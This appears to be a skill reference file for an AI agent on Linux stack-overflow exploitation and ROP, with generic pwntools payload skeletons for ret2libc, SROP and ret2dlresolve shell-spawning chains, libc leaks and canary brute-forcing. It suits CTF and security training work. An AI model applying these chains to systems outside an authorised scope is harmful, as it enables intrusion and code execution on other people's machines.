---
name: stack-overflow-and-rop
description: Stack overflow to control-flow hijack for Linux userland. Use when exploiting a stack buffer overflow — offset discovery, saved-return-address overwrite, ret2win, ret2shellcode, ret2libc, ROP chains, ret2csu, ret2dlresolve, SROP, stack pivoting, canary leak or brute force — or when a ROP chain crashes and you need failure triage. Covers glibc 2.34+ changes and cross-architecture differences.
---

# SKILL: Stack Overflow & ROP

Depth reference for stack-based control-flow hijack. Technique selection and the shared toolchain are `exploit-dev`; mitigation assessment and leak taxonomy are `binary-protection-bypass`; heap bugs are `heap-exploitation`; offset discovery and crash triage at runtime are `dynamic-verification`; bug class → primitive mapping is `bug-class-catalog`.

Use on targets you are authorized to attack — CTF, your own lab, or a scoped engagement.

## Discipline

**A ROP chain is not an exploit until it runs.** Static gadget math is a hypothesis. Every claim below — offset, leak, chain — gets proven by running the process and showing the result. Do not report "should give a shell"; report the `id` output or say it failed and why.

Two numbers matter when reporting: whether it worked, and **how often**. Alignment, brute-force, and heap/stack layout luck make partially-reliable chains common. Run it 10× and state the success rate.

## Workflow

1. **Triage** — `scripts/rop-triage.sh ./binary` (arch, mitigations, gadgets, GOT/PLT, strings). Mitigations decide the technique before you read a line of disassembly.
2. **Confirm the overflow** — reach it, crash it, prove you control the saved return address (`x/gx $rsp` at the `ret`).
3. **Find the offset** — `cyclic`/`pattern_offset`. See `dynamic-verification`.
4. **Get what's missing** — canary, libc base, PIE base. Leak before you build.
5. **Build the chain** — smallest thing that works: ret2win < one_gadget < ret2libc < full ROP < ret2csu/SROP/ret2dlresolve.
6. **Verify locally, then remotely.** Match the libc first.

## Stack Layout

```
High Address
┌───────────────────────┐
│   caller frame        │
├───────────────────────┤
│   Return Address      │  ← overwrite target (EIP/RIP control)
├───────────────────────┤
│   Saved EBP/RBP       │  ← overwrite for stack pivoting
├───────────────────────┤
│   Canary (if enabled) │  ← must be preserved or leaked
├───────────────────────┤
│   Local Variables     │  ← buffer starts here, grows up toward the canary
└───────────────────────┘
Low Address
```

| Element | x86 (32-bit) | x86-64 |
|---|---|---|
| Return address / saved FP | 4 bytes | 8 bytes |
| Canary | 4 bytes, low byte `\x00` | 8 bytes, low byte `\x00` |
| Canary location | `gs:[0x14]` | `fs:[0x28]` |
| Argument passing | stack | RDI, RSI, RDX, RCX, R8, R9, then stack |
| Syscall | `int 0x80` (eax, ebx, ecx, edx) | `syscall` (rax, rdi, rsi, rdx, r10, r8, r9) |
| `rt_sigreturn` number | 173 (`sigreturn` = 119) | 15 |

## Mitigation → Technique

| checksec says | Do this |
|---|---|
| NX disabled | `ret2shellcode` — shellcode in the buffer, ret to it (needs a known buffer address) |
| NX, no canary, no PIE | Direct ROP. ret2win if a win function exists |
| Canary present | Leak it (`format-string-exploitation`, OOB read, uninitialized read) or brute-force byte-by-byte in a **fork-without-exec** server (`binary-protection-bypass`) |
| PIE | Leak a code pointer, or partial-overwrite the low bytes (see `references/advanced-rop.md`) |
| ASLR only | Leak libc via GOT read, then compute base |
| Full RELRO | GOT is read-only — pick a different write target (see below) |
| Static binary | No libc, no PLT to leak — build a `syscall` chain or use SROP |
| Seccomp blocks execve | ORW chain (`references/advanced-rop.md`) |

Check seccomp explicitly — `seccomp-tools dump ./binary`. Discovering the filter after building an `execve` chain wastes the whole chain.

## ret2libc

Overwrite the saved return address with a libc function and control its arguments.

```python
# 32-bit: arguments on the stack, after a fake return address
payload  = b'A' * offset
payload += p32(system_addr)
payload += p32(exit_addr)        # fake return address for system()
payload += p32(binsh_addr)       # arg1

# 64-bit: arguments in registers, so you need gadgets
payload  = b'A' * offset
payload += p64(ret)              # stack alignment, see below
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)
```

**Stack alignment (x86-64).** `system()` reaches a `movaps xmm*, [rsp+...]` inside `do_system` which faults unless RSP is 16-byte aligned. If you crash on a `movaps` with a valid-looking chain, insert one bare `ret` gadget to shift RSP by 8. This is the single most common "my chain is correct but it segfaults" cause.

### Leaking libc

| Method | When |
|---|---|
| `puts@plt(puts@got)` | Cheapest. Fails if the address contains `\x00` in a printed position — `puts` stops at the first null |
| `write@plt(1, got, 8)` | Null-safe, gives exactly 8 bytes. Prefer this when `write` is available |
| `printf("%s", got)` | Format string primitive already present |
| Uninitialized stack read | No output function needed |

```python
rop  = b'A' * offset
rop += p64(pop_rdi) + p64(elf.got['puts'])
rop += p64(elf.plt['puts'])
rop += p64(main_addr)                       # return to main for a second payload

io.sendline(rop)
leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))   # NOT .strip() — it eats 0x0a/0x20 bytes
                                                   # that belong to the address
libc.address = leak - libc.symbols['puts']         # sets the base for all later symbols
```

The GOT entry must already be **resolved** — call the function once before leaking it, or leak a function the binary has already used.

Identify an unknown remote libc from the leak with `libc-identify` / libc-database, then `pwninit` or `patchelf --set-interpreter/--replace-needed` to run locally against the same libc. See `exploit-dev` for the local libc-database setup.

### one_gadget

```bash
one_gadget ./libc.so.6        # add -l 2 for more candidates with looser constraints
```

Each gadget prints constraints (`rsp & 0xf == 0`, `[rsp+0x40] == NULL`, `rcx == NULL`, …). They are evaluated **at the moment you jump there**, not earlier — check the register/stack state in GDB at that exact point. If all candidates fail, set the offending register with a gadget (commonly `rdx`/`rcx` = 0) or fall back to `system("/bin/sh")`.

## ROP Chain Construction

| Tool | Use for |
|---|---|
| `ROPgadget --binary elf --ropchain` | Auto-generated `execve` chain; works surprisingly often on static binaries |
| `ropper -f elf --search "pop rdi"` | Semantic search, JOP/COP gadgets |
| `pwntools ROP` | `rop = ROP([elf, libc]); rop.call('system', [next(libc.search(b'/bin/sh\x00'))])` |

**Search libc, not just the binary.** Once you have a libc base, the whole library is gadget space — this is where `pop rdx` gadgets live in modern targets.

| Need | Gadget |
|---|---|
| arg1 | `pop rdi; ret` |
| arg2 | `pop rsi; ret`, often only `pop rsi; pop r15; ret` |
| arg3 | `pop rdx; ret` — rare in the binary, common in libc |
| syscall | `syscall; ret` or `syscall` |
| pivot | `leave; ret`, `pop rsp; ret`, `xchg rsp, rax; ret` |
| alignment | bare `ret` |

## ret2csu — and why it often doesn't exist any more

`__libc_csu_init` gives a universal 3-argument call in binaries **linked against glibc < 2.34**.

```nasm
; gadget 1 — pop six registers
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
;   rbx=0  rbp=1   call target ptr   → rdx   → rsi   → edi

; gadget 2 — the controlled call
mov rdx, r13
mov rsi, r14
mov edi, r15d          ; 32-bit only — cannot set the top half of RDI
call [r12 + rbx*8]     ; r12 must point to a POINTER to the target (e.g. a GOT entry)
add rbx, 1
cmp rbp, rbx
jne  <loop>
add rsp, 8             ; then falls into gadget 1's pops → 56 bytes of padding
pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
```

Set `rbx=0`, `rbp=1` so the loop exits after one call. Pad **56 bytes** after the call gadget before your next return address.

> **glibc ≥ 2.34 (Ubuntu 22.04+, Debian 12+) removed `__libc_csu_init`.** The gadget is gone. Check with `nm -C ./binary | grep csu` or `ROPgadget --binary ./binary | grep 'pop rbx'`. Replacements: `__libc_start_call_main` fragments, gadgets inside `ld.so`, or — most practically — leak libc first and take `pop rdx` from there. Otherwise use SROP.

Verify the actual disassembly before using the offsets: some builds emit `call r12` rather than `call [r12+rbx*8]`, which changes what you put in `r12`.

## ret2dlresolve

Forge ELF relocation structures so the dynamic linker resolves `system` for you — **no libc leak needed**.

**Preconditions, all required:** Partial RELRO (lazy binding — `BIND_NOW`/Full RELRO kills it), a known writable address (so no PIE, or PIE already leaked), and enough overflow to stage the forged structures.

```python
from pwn import *                       # NOT "from pwntools import *"
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)        # stage the forged Elf_Rel/Elf_Sym/string
rop.ret2dlresolve(dlresolve)
io.sendline(flat({offset: rop.chain()}))
io.sendline(dlresolve.payload)
```

Use pwntools' automation; hand-forging is error-prone and rarely necessary.

| | 32-bit | 64-bit |
|---|---|---|
| Relocation | `Elf32_Rel`, 8 bytes | `Elf64_Rela`, 24 bytes |
| Symbol entry | `Elf32_Sym`, 16 bytes | `Elf64_Sym`, 24 bytes |
| Index constraint | Relaxed | `reloc_offset` must make `reloc_arg/24` land in the real symtab bounds — forces the fake structures far from `.dynamic`, sometimes out of reach |
| Version check | Usually skippable | `VERSYM[index]` must be 0 or valid |

64-bit ret2dlresolve is materially harder than 32-bit. If the index constraint puts your forged data out of reach, switch to SROP.

## SROP

`sigreturn` restores **every register** from a frame on the stack — one gadget replaces an entire register-setup chain.

```python
frame = SigreturnFrame()            # amd64 frame is 248 bytes; budget the overflow for it
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
frame.rsp = pivot_addr              # optional: pivot at the same time

payload  = b'A' * offset
payload += p64(pop_rax) + p64(15)   # SYS_rt_sigreturn (x86-64); 173 on x86-32
payload += p64(syscall_ret)
payload += bytes(frame)
```

Needs: a way to set `rax` (a `pop rax` gadget, or a syscall returning 15 — `read` of 15 bytes is the classic trick), a `syscall` instruction, and ~250+ bytes of overflow.

Best when: static binary, no `pop rdx`, no csu gadget, seccomp-constrained, or you need a stack pivot for free.

## Stack Pivoting

When the overflow is too short for the chain, move RSP into a buffer you control.

| Technique | Precondition |
|---|---|
| `leave; ret` | Control the saved RBP |
| `pop rsp; ret` | A `pop rsp` gadget exists |
| `xchg rsp, rax; ret` | Control RAX |
| `add rsp, N; ret` | Chain sits N bytes further down |
| SROP `frame.rsp` | Only need `sigreturn` |

```
leave;ret pivot:  [padding][fake_rbp → buf][leave_ret]
  1st leave: rsp = fake_rbp;  pop rbp = *fake_rbp
  1st ret:   rip = leave_ret
  2nd leave: rsp = buf + 8;   pop rbp = *buf
  2nd ret:   rip = *(buf+8)  → your chain runs from buf+16
```

Stage the long chain first (via `read` into `.bss`), then pivot.

## Canary Bypass

| Technique | Condition |
|---|---|
| Format string leak | `%N$p` — walk the stack to find the value ending in `00` |
| Byte-by-byte brute-force | Server does `fork()` **without `exec`** (child inherits the canary). Low byte is `\x00`, so 7 unknown bytes on 64-bit: 1792 worst case, ~896 expected |
| Partial overwrite | Overflow stops exactly at the canary — never touch it |
| Overwrite the TLS copy | Overflow also reaches `fs:[0x28]` — write the same value both places |
| Uninitialized / OOB read | Canary appears in leaked stack data |

A `fork` + `execve` server re-randomizes the canary per connection: brute-force is off the table, and so is BROP.

## Write Targets When Full RELRO Blocks the GOT

> **glibc ≥ 2.34 removed `__malloc_hook` / `__free_hook` / `__realloc_hook`.** They are no longer called. Chains that target them silently do nothing on modern systems — check `libc.symbols` before planning around them.

Current targets, in rough order of practicality:

| Target | Trigger |
|---|---|
| `_IO_FILE` vtable / FSOP on `stdout`/`stderr` | Any `puts`/`printf`/`exit`/stream flush |
| `__exit_funcs` (atexit list, PTR_MANGLE'd) | `exit()` — needs the TLS `pointer_guard` or a mangling-free path |
| `tls_dtor_list` | `exit()` — also mangled |
| Saved return address of a live frame | Direct, if you can find the stack |
| `link_map`/`_dl_fini` structures | Program exit |

Full target catalog — preconditions, triggers, FSOP/House-of-Apple mechanics, PTR_MANGLE handling, and the `setcontext` register-set pivot — is `arbitrary-write-to-rce`.

## Failure Triage

| Symptom | Cause | Fix |
|---|---|---|
| SIGSEGV at `movaps ...,[rsp+…]` inside `do_system` | RSP not 16-byte aligned | Insert a bare `ret` gadget |
| Chain starts then dies at a garbage address | Off-by-N offset, or a gadget popped more than you fed it | Recount pops per gadget; re-run `cyclic` |
| Payload truncated | `strcpy`/`sprintf` stop at `\x00`; `gets`/`fgets`/`scanf %s` stop at `\n` or whitespace | Avoid those bytes, or reach the overflow through a `read()` path |
| Leak is short or empty | `puts` stopped at a null byte in the address | Use `write(1, got, 8)` |
| Leak parses to nonsense | `.strip()` removed `0x0a`/`0x20` bytes belonging to the address | `recvline()[:-1]` |
| Works locally, fails remotely | libc mismatch | Identify remote libc from the leak, re-run locally against it |
| Works in GDB, fails outside | GDB changes env/argv, shifting stack addresses | Test with `env -i`; never hardcode a stack address seen only in GDB |
| Everything is right, still no shell | Seccomp | `seccomp-tools dump`; switch to ORW |
| one_gadget doesn't fire | Constraints unmet at the jump | Check them in GDB at that instruction; set `rdx`/`rcx` = 0 or use `system` |
| ret2csu gadget not found | glibc ≥ 2.34 | Use libc gadgets after a leak, or SROP |

## Advanced Techniques

`references/advanced-rop.md` covers: Blind ROP against remote services with no binary, partial overwrite for PIE bypass, ORW chains under seccomp, JOP/COP under CET, ret2vdso, and ARM/AArch64/MIPS gadget conventions.

## Tools

```bash
checksec --file=./binary                      # mitigations
seccomp-tools dump ./binary                   # syscall filter — check BEFORE building a chain
ROPgadget --binary ./binary --ropchain        # auto chain
ropper -f ./binary --search "pop rdi; ret"    # semantic search
one_gadget ./libc.so.6 -l 2                   # one-shot execve gadgets
pwn cyclic 200 ; pwn cyclic -l 0x6161616c     # offset discovery
pwn template --host HOST --port PORT ./binary # exploit skeleton
pwninit                                       # patch binary to a provided libc/loader
```

Related skills: `exploit-dev` (technique selection, libc-database, pwntools workflow) · `binary-protection-bypass` (mitigation table, leak taxonomy, partial overwrite, brute force) · `arbitrary-write-to-rce` (target catalog once you have a write) · `heap-exploitation` (when the overflow is on the heap) · `format-string-exploitation` (the usual source of the canary/libc leak) · `dynamic-verification` (GDB/pwndbg, offset discovery, crash triage) · `bug-class-catalog` (finding the overflow in source) · `re-tools` (locating the vulnerable function in a stripped binary).
